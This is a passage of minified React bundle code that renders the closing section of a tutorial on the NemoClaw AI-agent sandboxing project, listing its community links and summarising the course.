a warning to a permanent ban depending on severity."})}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Beyond Discord"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"The NemoClaw community extends beyond Discord. The project maintains a presence across several platforms, each serving a different purpose in the ecosystem."}),e.jsx(l,{references:[{title:"NemoClaw GitHub Repository",url:"https://github.com/nemoclaw/nemoclaw",description:"Source code, issues, pull requests, and releases. The authoritative source for the project."},{title:"NemoClaw Discord Server",url:"https://discord.gg/nemoclaw",description:"Real-time community discussion, help, and events."},{title:"NemoClaw Documentation",url:"https://docs.nemoclaw.dev",description:"Official documentation including API reference, guides, and tutorials."},{title:"NemoClaw Blueprint Registry",url:"https://blueprints.nemoclaw.dev",description:"Community-contributed blueprints with search and security audit reports."},{title:"NemoClaw Blog",url:"https://blog.nemoclaw.dev",description:"Technical blog posts about NemoClaw development, security research, and best practices."},{title:"@nemoclaw on X/Twitter",url:"https://x.com/nemoclaw",description:"Release announcements, community highlights, and project updates."}]}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"This concludes the Advanced Topics and Ecosystem subject. You now have the knowledge to run models locally, create and distribute custom blueprints, work with advanced sandbox configurations, debug isolation issues at the kernel level, and contribute to the NemoClaw project itself. The security of AI agents is a rapidly evolving field, and the NemoClaw community is at the forefront of building the tools and practices that make autonomous agents safe to deploy. Your participation -- whether as a user, a blueprint author, a bug reporter, or a code contributor -- makes the ecosystem stronger for everyone."})]})}const H=Object.freeze(Object.defineProperty({__proto__:null,default:C},Symbol.toStringTag,{value:"Module"}));export{T as a,M as b,D as c,P as d,S as e,R as f,O as g,q as h,B as i,E as j,U as k,G as l,F as m,V as n,z as o,W as p,H as q,_ as s};
